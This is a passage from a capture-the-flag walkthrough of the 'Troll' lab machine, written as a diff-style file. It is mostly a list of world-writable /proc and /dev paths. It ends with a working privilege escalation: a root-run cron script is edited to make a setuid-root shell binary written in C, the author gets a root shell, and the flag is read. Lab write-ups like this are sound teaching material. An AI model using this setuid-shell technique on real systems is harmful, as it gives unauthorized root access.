+/proc/1143/task/1177/attr/exec
+/proc/1143/task/1177/attr/fscreate
+/proc/1143/task/1177/attr/keycreate
+/proc/1143/task/1177/attr/sockcreate
+/proc/1143/task/1178/attr/current
+/proc/1143/task/1178/attr/exec
+/proc/1143/task/1178/attr/fscreate
+/proc/1143/task/1178/attr/keycreate
+/proc/1143/task/1178/attr/sockcreate
+/proc/1143/task/1179/attr/current
+/proc/1143/task/1179/attr/exec
+/proc/1143/task/1179/attr/fscreate
+/proc/1143/task/1179/attr/keycreate
+/proc/1143/task/1179/attr/sockcreate
+/proc/1143/task/1180/attr/current
+/proc/1143/task/1180/attr/exec
+/proc/1143/task/1180/attr/fscreate
+/proc/1143/task/1180/attr/keycreate
+/proc/1143/task/1180/attr/sockcreate
+/proc/1143/task/1181/attr/current
+/proc/1143/task/1181/attr/exec
+/proc/1143/task/1181/attr/fscreate
+/proc/1143/task/1181/attr/keycreate
+/proc/1143/task/1181/attr/sockcreate
+/proc/1143/task/1182/attr/current
+/proc/1143/task/1182/attr/exec
+/proc/1143/task/1182/attr/fscreate
+/proc/1143/task/1182/attr/keycreate
+/proc/1143/task/1182/attr/sockcreate
+/proc/1143/task/1183/attr/current
+/proc/1143/task/1183/attr/exec
+/proc/1143/task/1183/attr/fscreate
+/proc/1143/task/1183/attr/keycreate
+/proc/1143/task/1183/attr/sockcreate
+/proc/1143/task/1184/attr/current
+/proc/1143/task/1184/attr/exec
+/proc/1143/task/1184/attr/fscreate
+/proc/1143/task/1184/attr/keycreate
+/proc/1143/task/1184/attr/sockcreate
+/proc/1143/task/1185/attr/current
+/proc/1143/task/1185/attr/exec
+/proc/1143/task/1185/attr/fscreate
+/proc/1143/task/1185/attr/keycreate
+/proc/1143/task/1185/attr/sockcreate
+/proc/1143/task/1186/attr/current
+/proc/1143/task/1186/attr/exec
+/proc/1143/task/1186/attr/fscreate
+/proc/1143/task/1186/attr/keycreate
+/proc/1143/task/1186/attr/sockcreate
+/proc/1143/task/1187/attr/current
+/proc/1143/task/1187/attr/exec
+/proc/1143/task/1187/attr/fscreate
+/proc/1143/task/1187/attr/keycreate
+/proc/1143/task/1187/attr/sockcreate
+/proc/1143/task/1188/attr/current
+/proc/1143/task/1188/attr/exec
+/proc/1143/task/1188/attr/fscreate
+/proc/1143/task/1188/attr/keycreate
+/proc/1143/task/1188/attr/sockcreate
+/proc/1143/task/1189/attr/current
+/proc/1143/task/1189/attr/exec
+/proc/1143/task/1189/attr/fscreate
+/proc/1143/task/1189/attr/keycreate
+/proc/1143/task/1189/attr/sockcreate
+/proc/1143/task/1190/attr/current
+/proc/1143/task/1190/attr/exec
+/proc/1143/task/1190/attr/fscreate
+/proc/1143/task/1190/attr/keycreate
+/proc/1143/task/1190/attr/sockcreate
+/proc/1143/task/1191/attr/current
+/proc/1143/task/1191/attr/exec
+/proc/1143/task/1191/attr/fscreate
+/proc/1143/task/1191/attr/keycreate
+/proc/1143/task/1191/attr/sockcreate
+/proc/1143/task/1192/attr/current
+/proc/1143/task/1192/attr/exec
+/proc/1143/task/1192/attr/fscreate
+/proc/1143/task/1192/attr/keycreate
+/proc/1143/task/1192/attr/sockcreate
+/proc/1143/task/1193/attr/current
+/proc/1143/task/1193/attr/exec
+/proc/1143/task/1193/attr/fscreate
+/proc/1143/task/1193/attr/keycreate
+/proc/1143/task/1193/attr/sockcreate
+/proc/1143/task/1194/attr/current
+/proc/1143/task/1194/attr/exec
+/proc/1143/task/1194/attr/fscreate
+/proc/1143/task/1194/attr/keycreate
+/proc/1143/task/1194/attr/sockcreate
+/proc/1143/task/1195/attr/current
+/proc/1143/task/1195/attr/exec
+/proc/1143/task/1195/attr/fscreate
+/proc/1143/task/1195/attr/keycreate
+/proc/1143/task/1195/attr/sockcreate
+/proc/1143/task/1196/attr/current
+/proc/1143/task/1196/attr/exec
+/proc/1143/task/1196/attr/fscreate
+/proc/1143/task/1196/attr/keycreate
+/proc/1143/task/1196/attr/sockcreate
+/proc/1143/task/1197/attr/current
+/proc/1143/task/1197/attr/exec
+/proc/1143/task/1197/attr/fscreate
+/proc/1143/task/1197/attr/keycreate
+/proc/1143/task/1197/attr/sockcreate
+/proc/1143/task/1198/attr/current
+/proc/1143/task/1198/attr/exec
+/proc/1143/task/1198/attr/fscreate
+/proc/1143/task/1198/attr/keycreate
+/proc/1143/task/1198/attr/sockcreate
+/proc/1143/attr/current
+/proc/1143/attr/exec
+/proc/1143/attr/fscreate
+/proc/1143/attr/keycreate
+/proc/1143/attr/sockcreate
+/proc/1144/task/1144/attr/current
+/proc/1144/task/1144/attr/exec
+/proc/1144/task/1144/attr/fscreate
+/proc/1144/task/1144/attr/keycreate
+/proc/1144/task/1144/attr/sockcreate
+/proc/1144/task/1147/attr/current
+/proc/1144/task/1147/attr/exec
+/proc/1144/task/1147/attr/fscreate
+/proc/1144/task/1147/attr/keycreate
+/proc/1144/task/1147/attr/sockcreate
+/proc/1144/task/1148/attr/current
+/proc/1144/task/1148/attr/exec
+/proc/1144/task/1148/attr/fscreate
+/proc/1144/task/1148/attr/keycreate
+/proc/1144/task/1148/attr/sockcreate
+/proc/1144/task/1149/attr/current
+/proc/1144/task/1149/attr/exec
+/proc/1144/task/1149/attr/fscreate
+/proc/1144/task/1149/attr/keycreate
+/proc/1144/task/1149/attr/sockcreate
+/proc/1144/task/1150/attr/current
+/proc/1144/task/1150/attr/exec
+/proc/1144/task/1150/attr/fscreate
+/proc/1144/task/1150/attr/keycreate
+/proc/1144/task/1150/attr/sockcreate
+/proc/1144/task/1151/attr/current
+/proc/1144/task/1151/attr/exec
+/proc/1144/task/1151/attr/fscreate
+/proc/1144/task/1151/attr/keycreate
+/proc/1144/task/1151/attr/sockcreate
+/proc/1144/task/1152/attr/current
+/proc/1144/task/1152/attr/exec
+/proc/1144/task/1152/attr/fscreate
+/proc/1144/task/1152/attr/keycreate
+/proc/1144/task/1152/attr/sockcreate
+/proc/1144/task/1153/attr/current
+/proc/1144/task/1153/attr/exec
+/proc/1144/task/1153/attr/fscreate
+/proc/1144/task/1153/attr/keycreate
+/proc/1144/task/1153/attr/sockcreate
+/proc/1144/task/1154/attr/current
+/proc/1144/task/1154/attr/exec
+/proc/1144/task/1154/attr/fscreate
+/proc/1144/task/1154/attr/keycreate
+/proc/1144/task/1154/attr/sockcreate
+/proc/1144/task/1155/attr/current
+/proc/1144/task/1155/attr/exec
+/proc/1144/task/1155/attr/fscreate
+/proc/1144/task/1155/attr/keycreate
+/proc/1144/task/1155/attr/sockcreate
+/proc/1144/task/1156/attr/current
+/proc/1144/task/1156/attr/exec
+/proc/1144/task/1156/attr/fscreate
+/proc/1144/task/1156/attr/keycreate
+/proc/1144/task/1156/attr/sockcreate
+/proc/1144/task/1157/attr/current
+/proc/1144/task/1157/attr/exec
+/proc/1144/task/1157/attr/fscreate
+/proc/1144/task/1157/attr/keycreate
+/proc/1144/task/1157/attr/sockcreate
+/proc/1144/task/1158/attr/current
+/proc/1144/task/1158/attr/exec
+/proc/1144/task/1158/attr/fscreate
+/proc/1144/task/1158/attr/keycreate
+/proc/1144/task/1158/attr/sockcreate
+/proc/1144/task/1159/attr/current
+/proc/1144/task/1159/attr/exec
+/proc/1144/task/1159/attr/fscreate
+/proc/1144/task/1159/attr/keycreate
+/proc/1144/task/1159/attr/sockcreate
+/proc/1144/task/1160/attr/current
+/proc/1144/task/1160/attr/exec
+/proc/1144/task/1160/attr/fscreate
+/proc/1144/task/1160/attr/keycreate
+/proc/1144/task/1160/attr/sockcreate
+/proc/1144/task/1161/attr/current
+/proc/1144/task/1161/attr/exec
+/proc/1144/task/1161/attr/fscreate
+/proc/1144/task/1161/attr/keycreate
+/proc/1144/task/1161/attr/sockcreate
+/proc/1144/task/1162/attr/current
+/proc/1144/task/1162/attr/exec
+/proc/1144/task/1162/attr/fscreate
+/proc/1144/task/1162/attr/keycreate
+/proc/1144/task/1162/attr/sockcreate
+/proc/1144/task/1163/attr/current
+/proc/1144/task/1163/attr/exec
+/proc/1144/task/1163/attr/fscreate
+/proc/1144/task/1163/attr/keycreate
+/proc/1144/task/1163/attr/sockcreate
+/proc/1144/task/1164/attr/current
+/proc/1144/task/1164/attr/exec
+/proc/1144/task/1164/attr/fscreate
+/proc/1144/task/1164/attr/keycreate
+/proc/1144/task/1164/attr/sockcreate
+/proc/1144/task/1165/attr/current
+/proc/1144/task/1165/attr/exec
+/proc/1144/task/1165/attr/fscreate
+/proc/1144/task/1165/attr/keycreate
+/proc/1144/task/1165/attr/sockcreate
+/proc/1144/task/1166/attr/current
+/proc/1144/task/1166/attr/exec
+/proc/1144/task/1166/attr/fscreate
+/proc/1144/task/1166/attr/keycreate
+/proc/1144/task/1166/attr/sockcreate
+/proc/1144/task/1167/attr/current
+/proc/1144/task/1167/attr/exec
+/proc/1144/task/1167/attr/fscreate
+/proc/1144/task/1167/attr/keycreate
+/proc/1144/task/1167/attr/sockcreate
+/proc/1144/task/1168/attr/current
+/proc/1144/task/1168/attr/exec
+/proc/1144/task/1168/attr/fscreate
+/proc/1144/task/1168/attr/keycreate
+/proc/1144/task/1168/attr/sockcreate
+/proc/1144/task/1169/attr/current
+/proc/1144/task/1169/attr/exec
+/proc/1144/task/1169/attr/fscreate
+/proc/1144/task/1169/attr/keycreate
+/proc/1144/task/1169/attr/sockcreate
+/proc/1144/task/1170/attr/current
+/proc/1144/task/1170/attr/exec
+/proc/1144/task/1170/attr/fscreate
+/proc/1144/task/1170/attr/keycreate
+/proc/1144/task/1170/attr/sockcreate
+/proc/1144/task/1171/attr/current
+/proc/1144/task/1171/attr/exec
+/proc/1144/task/1171/attr/fscreate
+/proc/1144/task/1171/attr/keycreate
+/proc/1144/task/1171/attr/sockcreate
+/proc/1144/task/1172/attr/current
+/proc/1144/task/1172/attr/exec
+/proc/1144/task/1172/attr/fscreate
+/proc/1144/task/1172/attr/keycreate
+/proc/1144/task/1172/attr/sockcreate
+/proc/1144/attr/current
+/proc/1144/attr/exec
+/proc/1144/attr/fscreate
+/proc/1144/attr/keycreate
+/proc/1144/attr/sockcreate
+/proc/1219/task/1219/attr/current
+/proc/1219/task/1219/attr/exec
+/proc/1219/task/1219/attr/fscreate
+/proc/1219/task/1219/attr/keycreate
+/proc/1219/task/1219/attr/sockcreate
+/proc/1219/task/1231/attr/current
+/proc/1219/task/1231/attr/exec
+/proc/1219/task/1231/attr/fscreate
+/proc/1219/task/1231/attr/keycreate
+/proc/1219/task/1231/attr/sockcreate
+/proc/1219/task/1232/attr/current
+/proc/1219/task/1232/attr/exec
+/proc/1219/task/1232/attr/fscreate
+/proc/1219/task/1232/attr/keycreate
+/proc/1219/task/1232/attr/sockcreate
+/proc/1219/attr/current
+/proc/1219/attr/exec
+/proc/1219/attr/fscreate
+/proc/1219/attr/keycreate
+/proc/1219/attr/sockcreate
+/proc/1274/task/1274/attr/current
+/proc/1274/task/1274/attr/exec
+/proc/1274/task/1274/attr/fscreate
+/proc/1274/task/1274/attr/keycreate
+/proc/1274/task/1274/attr/sockcreate
+/proc/1274/attr/current
+/proc/1274/attr/exec
+/proc/1274/attr/fscreate
+/proc/1274/attr/keycreate
+/proc/1274/attr/sockcreate
+/proc/1284/task/1284/attr/current
+/proc/1284/task/1284/attr/exec
+/proc/1284/task/1284/attr/fscreate
+/proc/1284/task/1284/attr/keycreate
+/proc/1284/task/1284/attr/sockcreate
+/proc/1284/attr/current
+/proc/1284/attr/exec
+/proc/1284/attr/fscreate
+/proc/1284/attr/keycreate
+/proc/1284/attr/sockcreate
+/proc/4523/task/4523/attr/current
+/proc/4523/task/4523/attr/exec
+/proc/4523/task/4523/attr/fscreate
+/proc/4523/task/4523/attr/keycreate
+/proc/4523/task/4523/attr/sockcreate
+/proc/4523/attr/current
+/proc/4523/attr/exec
+/proc/4523/attr/fscreate
+/proc/4523/attr/keycreate
+/proc/4523/attr/sockcreate
+/proc/4547/task/4547/attr/current
+/proc/4547/task/4547/attr/exec
+/proc/4547/task/4547/attr/fscreate
+/proc/4547/task/4547/attr/keycreate
+/proc/4547/task/4547/attr/sockcreate
+/proc/4547/attr/current
+/proc/4547/attr/exec
+/proc/4547/attr/fscreate
+/proc/4547/attr/keycreate
+/proc/4547/attr/sockcreate
+/proc/4651/task/4651/attr/current
+/proc/4651/task/4651/attr/exec
+/proc/4651/task/4651/attr/fscreate
+/proc/4651/task/4651/attr/keycreate
+/proc/4651/task/4651/attr/sockcreate
+/proc/4651/attr/current
+/proc/4651/attr/exec
+/proc/4651/attr/fscreate
+/proc/4651/attr/keycreate
+/proc/4651/attr/sockcreate
+/proc/5543/task/5543/attr/current
+/proc/5543/task/5543/attr/exec
+/proc/5543/task/5543/attr/fscreate
+/proc/5543/task/5543/attr/keycreate
+/proc/5543/task/5543/attr/sockcreate
+/proc/5543/attr/current
+/proc/5543/attr/exec
+/proc/5543/attr/fscreate
+/proc/5543/attr/keycreate
+/proc/5543/attr/sockcreate
+/proc/5561/task/5561/attr/current
+/proc/5561/task/5561/attr/exec
+/proc/5561/task/5561/attr/fscreate
+/proc/5561/task/5561/attr/keycreate
+/proc/5561/task/5561/attr/sockcreate
+/proc/5561/attr/current
+/proc/5561/attr/exec
+/proc/5561/attr/fscreate
+/proc/5561/attr/keycreate
+/proc/5561/attr/sockcreate
+/proc/5562/task/5562/fd/0
+/proc/5562/task/5562/fd/1
+/proc/5562/task/5562/fd/2
+/proc/5562/task/5562/fd/10
+/proc/5562/task/5562/sched
+/proc/5562/task/5562/comm
+/proc/5562/task/5562/mem
+/proc/5562/task/5562/clear_refs
+/proc/5562/task/5562/attr/current
+/proc/5562/task/5562/attr/exec
+/proc/5562/task/5562/attr/fscreate
+/proc/5562/task/5562/attr/keycreate
+/proc/5562/task/5562/attr/sockcreate
+/proc/5562/task/5562/oom_adj
+/proc/5562/task/5562/oom_score_adj
+/proc/5562/task/5562/loginuid
+/proc/5562/task/5562/uid_map
+/proc/5562/task/5562/gid_map
+/proc/5562/task/5562/projid_map
+/proc/5562/fd/0
+/proc/5562/fd/1
+/proc/5562/fd/2
+/proc/5562/fd/10
+/proc/5562/sched
+/proc/5562/autogroup
+/proc/5562/comm
+/proc/5562/mem
+/proc/5562/clear_refs
+/proc/5562/attr/current
+/proc/5562/attr/exec
+/proc/5562/attr/fscreate
+/proc/5562/attr/keycreate
+/proc/5562/attr/sockcreate
+/proc/5562/oom_adj
+/proc/5562/oom_score_adj
+/proc/5562/loginuid
+/proc/5562/coredump_filter
+/proc/5562/uid_map
+/proc/5562/gid_map
+/proc/5562/projid_map
+/proc/5564/task/5564/fd/0
+/proc/5564/task/5564/fd/1
+/proc/5564/task/5564/fd/2
+/proc/5564/task/5564/fd/255
+/proc/5564/task/5564/sched
+/proc/5564/task/5564/comm
+/proc/5564/task/5564/mem
+/proc/5564/task/5564/clear_refs
+/proc/5564/task/5564/attr/current
+/proc/5564/task/5564/attr/exec
+/proc/5564/task/5564/attr/fscreate
+/proc/5564/task/5564/attr/keycreate
+/proc/5564/task/5564/attr/sockcreate
+/proc/5564/task/5564/oom_adj
+/proc/5564/task/5564/oom_score_adj
+/proc/5564/task/5564/loginuid
+/proc/5564/task/5564/uid_map
+/proc/5564/task/5564/gid_map
+/proc/5564/task/5564/projid_map
+/proc/5564/fd/0
+/proc/5564/fd/1
+/proc/5564/fd/2
+/proc/5564/fd/255
+/proc/5564/sched
+/proc/5564/autogroup
+/proc/5564/comm
+/proc/5564/mem
+/proc/5564/clear_refs
+/proc/5564/attr/current
+/proc/5564/attr/exec
+/proc/5564/attr/fscreate
+/proc/5564/attr/keycreate
+/proc/5564/attr/sockcreate
+/proc/5564/oom_adj
+/proc/5564/oom_score_adj
+/proc/5564/loginuid
+/proc/5564/coredump_filter
+/proc/5564/uid_map
+/proc/5564/gid_map
+/proc/5564/projid_map
+/proc/5572/task/5572/fd
+/proc/5572/task/5572/fd/0
+/proc/5572/task/5572/fd/1
+/proc/5572/task/5572/fd/2
+/proc/5572/task/5572/sched
+/proc/5572/task/5572/comm
+/proc/5572/task/5572/mem
+/proc/5572/task/5572/clear_refs
+/proc/5572/task/5572/attr/current
+/proc/5572/task/5572/attr/exec
+/proc/5572/task/5572/attr/fscreate
+/proc/5572/task/5572/attr/keycreate
+/proc/5572/task/5572/attr/sockcreate
+/proc/5572/task/5572/oom_adj
+/proc/5572/task/5572/oom_score_adj
+/proc/5572/task/5572/loginuid
+/proc/5572/task/5572/uid_map
+/proc/5572/task/5572/gid_map
+/proc/5572/task/5572/projid_map
+/proc/5572/fd
+/proc/5572/fd/0
+/proc/5572/fd/1
+/proc/5572/fd/2
+/proc/5572/map_files
+/proc/5572/sched
+/proc/5572/autogroup
+/proc/5572/comm
+/proc/5572/mem
+/proc/5572/clear_refs
+/proc/5572/attr/current
+/proc/5572/attr/exec
+/proc/5572/attr/fscreate
+/proc/5572/attr/keycreate
+/proc/5572/attr/sockcreate
+/proc/5572/oom_adj
+/proc/5572/oom_score_adj
+/proc/5572/loginuid
+/proc/5572/coredump_filter
+/proc/5572/uid_map
+/proc/5572/gid_map
+/proc/5572/projid_map
+/dev/log
+/dev/shm
+/dev/char/5:0
+/dev/char/5:2
+/dev/char/10:200
+/dev/char/10:229
+/dev/char/1:5
+/dev/char/1:8
+/dev/char/1:9
+/dev/char/1:3
+/dev/char/1:7
+/dev/stderr
+/dev/stdout
+/dev/stdin
+/dev/fd
+/dev/pts/0
+/dev/net/tun
+/dev/ptmx
+/dev/fuse
+/dev/tty
+/dev/urandom
+/dev/random
+/dev/full
+/dev/zero
+/dev/null
+/lib/log/cleaner.py
+
+11.) Check contents of "cleaner.py"
+This file cleans the contents of cleaner.py
+
+overflow@troll:/$ cat /lib/log/cleaner.py
+#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system('rm -r /tmp/* ')
+except:
+        sys.exit()
+overflow@troll:/$
+
+12.) Check the owner of "cleaner.py"
+overflow@troll:/$ ls -lah /lib/log/cleaner.py
+-rwxrwxrwx 1 root root 96 Aug 13 00:13 /lib/log/cleaner.py
+It is owned by root and has read/write/execute permissions on the file
+
+13.) Create a C application called ‘getroot’ which runs ‘/bin/bash’ and sets the UID as ’0′
+overflow@troll:/$ nano /var/tmp/getroot.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main()
+{
+   setuid( 0 );
+   system( "/bin/sh" );
+
+   return 0;
+}
+
+overflow@troll:/$ gcc /var/tmp/getroot.c -o /var/tmp/getroot
+
+14.) Use the "cleaner.py" python script change the owner of my C application to root and set it as SUID with chmod 4755.
+overflow@troll:/$ nano /lib/log/cleaner.py
+
+#!/usr/bin/env python
+import os
+import sys
+try:
+	os.system('chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot ')
+except:
+	sys.exit()
+
+15.) Run "cleaner.py" file
+overflow@troll:/$ python /lib/log/cleaner.py 
+chown: changing ownership of ‘/var/tmp/getroot’: Operation not permitted
+chmod: changing permissions of ‘/var/tmp/getroot’: Operation not permitted
+overflow@troll:/$ ls -lah /var/tmp/getroot
+-rwsr-xr-x 1 root root 7.2K Aug 15 05:22 /var/tmp/getroot
+overflow@troll:/$ /var/tmp/getroot 
+# whoami
+root
+# bash
+root@troll:/# id
+uid=0(root) gid=1002(overflow) groups=0(root),1002(overflow)
+
+16.) Get the flag
+root@troll:/var/tmp# cd /root/
+root@troll:/root# ls
+proof.txt
+root@troll:/root# cat proof.txt 
+Good job, you did it! 
+ 
+ 
+702a8c18d29c6f3ca0d99ef5712bfbdc
+
